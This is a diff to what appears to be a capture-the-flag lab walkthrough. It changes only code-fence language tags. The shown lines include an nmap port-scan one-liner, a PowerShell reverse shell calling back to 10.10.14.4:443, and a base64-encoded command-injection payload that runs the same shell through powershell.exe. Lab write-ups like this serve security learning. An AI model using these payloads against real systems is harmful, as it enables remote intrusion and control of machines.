@@ -36,7 +36,7 @@ graph TD
 
 # Enumeration
 
-```bash
+```console
 ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.8 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -p $ports 10.10.10.8
 ```
 
@@ -90,7 +90,7 @@ We got serve response. Now let’s to attack!
 
 First, the powershell reverse shell command was encoded in base64:
 
-```bash
+```powershell
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.4",443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()
 ```
 
@@ -98,7 +98,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.4",443); $stream = $
 
 After, this command was insert in payload. The payload was encoded in URL encode.
 
-```
+```console
 exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTQuNCIsNDQzKTsgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7IFtieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXt7MH19OyB3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLDAsJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXt7OyAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsJGkpOyAkc2VuZGJhY2sgPSAoSW52b2tlLUV4cHJlc3Npb24gJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsgJHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICJQUyAiICsgKEdldC1Mb2NhdGlvbikuUGF0aCArICI+ICI7ICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTsgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTsgJHN0cmVhbS5GbHVzaCgpfX07ICRjbGllbnQuQ2xvc2UoKQo="
 ```
 
